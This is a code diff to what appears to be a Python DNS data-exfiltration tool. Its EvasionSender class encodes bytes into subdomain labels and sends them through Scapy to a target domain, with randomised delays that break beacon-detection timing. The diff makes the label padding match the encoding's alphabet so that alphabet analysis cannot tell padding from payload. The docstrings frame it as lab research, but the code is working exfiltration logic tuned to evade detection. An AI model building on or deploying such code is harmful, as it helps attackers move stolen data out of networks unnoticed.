@@ -7,7 +7,6 @@ from __future__ import annotations
 
 import logging
 import random
-import string
 import time
 from dataclasses import dataclass, field
 
@@ -26,10 +25,10 @@ class EvasionConfig:
     Attributes:
         min_delay: Minimum seconds between queries. Must be >= 0.
         max_delay: Maximum seconds between queries. Must be >= min_delay.
-        padding_chars: Number of random lowercase ASCII characters appended
-            to each subdomain chunk before it is used as a label. Adding noise
-            characters reduces the label's per-character entropy slightly,
-            weakening entropy-based detection. Set to 0 to disable padding.
+        padding_chars: Count of random characters appended to each encoded
+            chunk before transmission. Characters are drawn from the alphabet
+            of the active ``ExfilConfig.encoding`` so padding blends with payload
+            symbols. Set to 0 to disable padding.
         seed: Optional random seed for reproducible test runs. None means
             the RNG is not seeded (default behaviour).
     """
@@ -75,12 +74,11 @@ class EvasionSender:
     - Randomised inter-query delay: each sleep duration is drawn from
       uniform(min_delay, max_delay), breaking the regular timing signal
       that beacon detectors rely on.
-    - Subdomain padding: a fixed number of random lowercase ASCII characters
-      are appended to each encoded chunk label before transmission, slightly
-      reducing the label's per-character entropy.
-    - Subdomain padding is applied to the transmitted label only and is not
-      reversible by the encoder's decode() method. This sender is a
-      one-way transmission research tool.
+    - Subdomain padding: random characters from the payload encoding's
+      alphabet are appended to each encoded chunk before transmission.
+    - Padding is applied on the wire only; ``DNSExfilEncoder.decode()`` cannot
+      strip it. Intended for controlled lab traffic against passive receivers
+      that strip non-alphabet characters during reconstruction.
 
     Args:
         exfil_config: ExfilConfig controlling domain, DNS server, chunk size.
@@ -91,21 +89,32 @@ class EvasionSender:
         self.exfil_config = exfil_config
         self.evasion_config = evasion_config
 
-    def _pad_label(self, label: str) -> str:
-        """Append padding_chars random lowercase ASCII characters to a label.
+    def _pad_label(self, chunk: str) -> str:
+        """Append padding characters drawn from the encoding's own alphabet.
+
+        Padding characters are drawn from the encoding-appropriate character set
+        so they cannot be distinguished from valid payload characters by alphabet
+        analysis alone.
 
         Args:
-            label: The encoded chunk label to pad.
+            chunk: The encoded chunk string to pad.
 
         Returns:
-            Padded label string. If padding_chars is 0, returns label unchanged.
+            Padded chunk. If padding_chars is 0, returns chunk unchanged.
         """
         if self.evasion_config.padding_chars == 0:
-            return label
+            return chunk
+        encoding = self.exfil_config.encoding
+        if encoding == "hex":
+            alphabet = "0123456789abcdef"
+        elif encoding == "base32":
+            alphabet = "abcdefghijklmnopqrstuvwxyz234567"
+        else:  # base64
+            alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
         padding = "".join(
-            random.choices(string.ascii_lowercase, k=self.evasion_config.padding_chars)
+            random.choices(alphabet, k=self.evasion_config.padding_chars)
         )
-        return label + padding
+        return chunk + padding
 
     def send_query(self, fqdn: str) -> bool:
         """Craft and send a single DNS A-record query using Scapy.
@@ -137,14 +146,15 @@ class EvasionSender:
     def exfiltrate(self, data: bytes) -> EvasionResult:
         """Encode data and transmit queries with randomised timing and padded labels.
 
-        Each encoded chunk label is padded with random lowercase characters
-        before transmission. Inter-query delays are drawn independently from
-        uniform(min_delay, max_delay). The terminator label ("done") is never
-        padded. Delays are applied between queries only — not after the last one.
+        Each encoded chunk is padded per ``EvasionConfig`` using the active
+        encoding's alphabet. Inter-query delays are drawn independently from
+        ``uniform(min_delay, max_delay)``. The terminator label (``done``) is
+        never padded. Delays are applied between queries only, not after the
+        final query.
 
         Args:
-            data: Raw bytes to exfiltrate. Empty data returns a zero EvasionResult
-                  with no queries sent.
+            data: Raw bytes to send. Empty input returns a zero ``EvasionResult``
+                with no queries sent.
 
         Returns:
             EvasionResult with transmission statistics including avg_delay_seconds.
@@ -181,7 +191,13 @@ class EvasionSender:
             # Extract and optionally pad the subdomain label.
             label = fqdn.split(".")[0]
             if label != "done":
-                label = self._pad_label(label)
+                label_parts = label.split("_", 2)
+                if len(label_parts) == 3:
+                    seq_part, tag_part, chunk_part = label_parts
+                    padded_chunk = self._pad_label(chunk_part)
+                    label = f"{seq_part}_{tag_part}_{padded_chunk}"
+                else:
+                    label = self._pad_label(label)
             padded_fqdn = f"{label}.{self.exfil_config.target_domain}"
 
             delay = random.uniform(
